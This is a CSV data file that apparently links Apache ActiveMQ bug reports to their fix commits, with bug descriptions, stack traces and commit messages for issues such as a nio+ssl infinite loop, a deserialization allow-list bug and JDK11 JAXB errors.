bug id,bug key,bug description,commit hash,commit msg
13407920,AMQ-8408,<NA>,2647500b3f10e7c57aef8018788158e1b9d3b2c2,[AMQ-8408] Add noee on activemq-web-console bundle
13363870,AMQ-8183,"There is a regression caused by AMQ-7106 that can lead to an infinite loop and high cpu usage when using the nio+ssl transport if maxFrameSize is configured. The issue shows up when several messages come into the broker that exceed the max frame size. The broker properly detects the error and kills the connection in another thread but the transport thread can get stuck in an infinite loop inside serviceRead() method of NIOSSLTransport.

It's a bit hard to tell what is going on but the issue appears to be due to the fact that the transport has already been stopped but there's no condition being hit to break the loop. The transport logic appears to get into a weird state trying to process a partial frame in a local buffer in the serviceRead() method but the logic just keeps spinning and never tries to re-read from the socket because the currentBuffer in the transport is wasn't allocated due to the async shutdown.

The fix here is pretty simple and that is to check if the transport has been stopped and exit the loop. I have only seen this with OpenWire and nio+ssl but the fix I'm adding will work for all nio+ssl and nio transports.",944ca6c7e1dc4f44b61ce05b77c180c686e2ae76,"AMQ-8183 - prevent infinite loop when maxFrameSize is exceeded

This makes sure the nio transport thread properly terminates if
maxFrameSize is exceeded with OpenWire to prevent an infinite loop that
uses up all the cpu"
13363870,AMQ-8183,"There is a regression caused by AMQ-7106 that can lead to an infinite loop and high cpu usage when using the nio+ssl transport if maxFrameSize is configured. The issue shows up when several messages come into the broker that exceed the max frame size. The broker properly detects the error and kills the connection in another thread but the transport thread can get stuck in an infinite loop inside serviceRead() method of NIOSSLTransport.

It's a bit hard to tell what is going on but the issue appears to be due to the fact that the transport has already been stopped but there's no condition being hit to break the loop. The transport logic appears to get into a weird state trying to process a partial frame in a local buffer in the serviceRead() method but the logic just keeps spinning and never tries to re-read from the socket because the currentBuffer in the transport is wasn't allocated due to the async shutdown.

The fix here is pretty simple and that is to check if the transport has been stopped and exit the loop. I have only seen this with OpenWire and nio+ssl but the fix I'm adding will work for all nio+ssl and nio transports.",2712464b78f76affd34cc0b097a2248f211ea0c7,"AMQ-8183 - apply maxFrameSize high cpu usage fix to Auto nio transport
also"
13356519,AMQ-8138,"On a broker recently upgraded to 5.16.1, I've seen the following warning:
{code}
2021-02-03 16:21:00,745 [ActiveMQ NIO Worker 9] WARN ProtocolConverter - Exception occurred for client null (null) processing: SEND -> org.apache.activemq.transport.stomp.ProtocolException: Not connected.
{code}

This looks a lot like AMQ-7444.

If possible, it would be good to log client IP information for this warning too.",2e169f0bc3db3e16fe2928ac03b3308c69b5e72a,[AMQ-8138] Set client IP address with Stomp host header
13350828,AMQ-8117,"Dear,

The VirtualSelectorCacheBrokerPlugin throws an error in the following method:
{code:java}
if (!(desc.getName().equals(""java.lang.String"") || desc.getName().startsWith(""java.util.""))) {
 throw new InvalidClassException(""Unauthorized deserialization attempt"", desc.getName());
 }
{code}
This exception is thrown because there are some lines in the selector cache file that do not match the given ""startsWith(""java.util."")"". The code will throw an exception because of the ""[L"" prefix in front of some java.util. elements in the file:

!image-2021-01-07-09-36-50-044.png!

My activemq.xml and file.data are attached to this ticket.

The selector cache is working fine if I use ActiveMQ version 5.15.11 or below.

I have tried to add jdk.serialFilters for the Concurrent Hashmap, like:

wrapper.java.additional.13=-Djdk.serialFilter=java.util.** (wrapper.conf) and also tried to add this to the java security file, but that did not work.

I hope this issue can be fixed or if it is not a bug, the documentation can be complemented with some notes on how to configure this filters the right way.

Best regards,

Joost",7ca7118a9544fd6b2aac4dd72fd3a6edc3369aca,AMQ-8117 - Allow java.util arrays for deserialization
13346432,AMQ-8104,"If audit log is turned on then Pause Queue doesn't work and causes java.lang.NullPointerException.

*Steps to reproduce:*
 1. Start ActiveMQ normally with audit log turned on: ./activemq start -Dorg.apache.activemq.audit=true
 2. Create a Queue normarlly: [http://127.0.0.1:8161/admin/] > Queues > Enter Queue Name > Create 
 3. Pause newly created queue: Click on `Pause`.

*Expected result:*
 - Queue is paused normally.

*Achieved result:* 
 - Error in web console:
 Error! Exception occurred while processing this request, check the log for more information!
!Screen Shot 2020-12-16 at 9.51.20 AM.png!
 - Error in the `activemq.log`:
{code:java}
 2020-12-16 09:50:41,877 | INFO  | Starting Jetty server | org.apache.activemq.transport.WebTransportServerSupport | main2020-12-16 09:50:41,992 | INFO  | Creating Jetty connector | org.apache.activemq.transport.WebTransportServerSupport | main2020-12-16 09:50:42,124 | WARN  | ServletContext@o.e.j.s.ServletContextHandler@5e4bd84a{/,null,STARTING} has uncovered http methods for path: / | org.eclipse.jetty.security.SecurityHandler | main2020-12-16 09:50:42,199 | INFO  | Listening for connections at ws://3c22fb843faa.ant.amazon.com:61614?maximumConnections=1000&wireFormat.maxFrameSize=104857600 | org.apache.activemq.transport.ws.WSTransportServer | main2020-12-16 09:50:42,201 | INFO  | Connector ws started | org.apache.activemq.broker.TransportConnector | main2020-12-16 09:50:42,203 | INFO  | Apache ActiveMQ 5.15.14 (localhost, ID:3c22fb843faa.ant.amazon.com-55549-1608141041704-0:1) started | org.apache.activemq.broker.BrokerService | main2020-12-16 09:50:42,204 | INFO  | For help or more information please see: http://activemq.apache.org | org.apache.activemq.broker.BrokerService | main2020-12-16 09:50:42,937 | INFO  | ActiveMQ WebConsole available at http://0.0.0.0:8161/ | org.apache.activemq.web.WebConsoleStarter | main2020-12-16 09:50:42,938 | INFO  | ActiveMQ Jolokia REST API available at http://0.0.0.0:8161/api/jolokia/ | org.apache.activemq.web.WebConsoleStarter | main2020-12-16 09:51:04,036 | WARN  | /admin/pauseDestination.action | org.eclipse.jetty.server.HttpChannel | qtp1803093683-37javax.servlet.ServletException: javax.servlet.ServletException: org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.NullPointerException at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:162)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.Server.handle(Server.java:516)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:388)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:633)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:380)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:273)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:105)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:336)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:313)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:171)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:375)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:773)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:905)[jetty-all-9.4.35.v20201120-uber.jar:9.4.35.v20201120] at java.lang.Thread.run(Thread.java:748)[:1.8.0_272]{code}",651c5ff2cfe72c0de5f4f486c965cdbb80ceba0d,"- Tests AMQ-8104
- Fixes AMQ-8104"
13337895,AMQ-8060,"Hi All,

We are trying to migrate from version 5.15.11 on 5.16.0.

And we have faced with an error with loading the activemq.xml:

2020-10-28 20:27:13,271 | ERROR | Failed to load: class path resource [activemq.xml], reason: Line 126 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException; lineNumber: 126; columnNumber: 163; cvc-complex-type.3.2.2: Attribute 'allowLinkStealing' is not allowed to appear in element 'transportConnector'. | org.apache.activemq.xbean.XBeanBrokerFactory | main
 org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 126 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException; lineNumber: 126; columnNumber: 163; cvc-complex-type.3.2.2: Attribute 'allowLinkStealing' is not allowed to appear in element 'transportConnector'.

As I can see the problem is that we are using XML validation with referring on generic XSD, like this:
{code:xml}
<beans
 xmlns=""http://www.springframework.org/schema/beans""
 xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
 xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
 http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">{code}
And allowLinkStealing attribute is absent in the new versions of the XSD (generic and activemq-core-5.16.0.xsd).

While allowLinkStealing property is still available for Transport configuration why it was excluded from XSD?",0146d5eb3e69e086ec19df1df1b2b7966c644d26,[AMQ-8060] Re add allowLinkStealing on transport connector for backward compatibility
13325918,AMQ-8032,"If the broker configuration contains runtimeConfigurationPlugin like this:
{code:java}
<broker ...>
 ...
         <plugins>
          <runtimeConfigurationPlugin checkPeriod=""1000""/>
        </plugins>
  ...
</broker>{code}
the broker doesn't start due to:
{code:java}
Caused by: java.lang.NoClassDefFoundError: javax/xml/bind/JAXBException
        at org.apache.activemq.plugin.RuntimeConfigurationPlugin.installPlugin(RuntimeConfigurationPlugin.java:38)
        at org.apache.activemq.broker.BrokerService.addInterceptors(BrokerService.java:2505)
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:2365)
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:1053)
        at org.apache.activemq.broker.BrokerService.getAdminConnectionContext(BrokerService.java:2636)
        at org.apache.activemq.broker.BrokerService.startVirtualConsumerDestinations(BrokerService.java:2797)
        at org.apache.activemq.broker.BrokerService.startDestinations(BrokerService.java:2627)
        at org.apache.activemq.broker.BrokerService.doStartBroker(BrokerService.java:747)
        at org.apache.activemq.broker.BrokerService.startBroker(BrokerService.java:741)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:644)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:73)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:566)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1748)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1685)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1615)
        ... 27 more
Caused by: java.lang.ClassNotFoundException: javax.xml.bind.JAXBException
        at java.base/java.net.URLClassLoader.findClass(URLClassLoader.java:471)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:588)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:521)
        ... 45 more {code}
The problem is in the JAXB version in use. A simple workaround is to add JAXB (API and Core) in activemq/lib (I'm testing the fix).

So, it could be just a question of documentation to add JAXB jar in ActiveMQ in order to use runtimeConfigurationPlugin.",9b6a48ad31b2fb4b3a5a129d4ed6119024c6850a,[AMQ-8032] Add JAXB in lib by default to avoid issue with JDK11
13313251,AMQ-7505,"The following files don't contain the license header:

activemq-web/src/main/resources/org/apache/activemq/web/prototype.js
activemq-unit-tests/src/test/java/org/apache/activemq/usecases/QueueBrowsingDisableConcurrentStoreAndDispatchTest.java
activemq-unit-tests/src/test/java/org/apache/activemq/usecases/UsageBlockedDispatchConcurrentStoreAndDispatchFalseTest.java",5901d9a6f0b66f68de75944638f23f4b9676a319,AMQ-7505 - Adding missing license headers to two source files
13310973,AMQ-7497,"Inbound MDBs supported by endpoint workers in the RAR support reconnect and failover with maxReconnects=0. In this way the failover transport can support the use of multiple brokers.
The failover url with no reconnects will leave the resource adapter single xaResource connection in an invalid state after disconnect and will cause periodic recovery to fail.
The single RA wide xaResource should reconnect any failed connection on subsequent usage.",a7b06c043c34978125b57016a8bd82d9bb2fa6a5,AMQ-7497 - tidy up test cleanup for random order runs
13310973,AMQ-7497,"Inbound MDBs supported by endpoint workers in the RAR support reconnect and failover with maxReconnects=0. In this way the failover transport can support the use of multiple brokers.
The failover url with no reconnects will leave the resource adapter single xaResource connection in an invalid state after disconnect and will cause periodic recovery to fail.
The single RA wide xaResource should reconnect any failed connection on subsequent usage.",8cc5386fbbe7a836ac9aef3cffcb56c0b9f65adc,AMQ-7497 - further test to verify behaviour after ra.stop
13302787,AMQ-7476,"Since the merge of PR #277 ([https://github.com/apache/activemq/pull/277]), when using a proxy, we get:
{code:java}
 I/O exception (org.apache.http.conn.UnsupportedSchemeExce      ption) caught when processing request to ... - http protocol is not supported{code}",910a028fa7dd9659044f4e44392197830d9b463e,[AMQ-7476] Add http schema in the HTTP registry
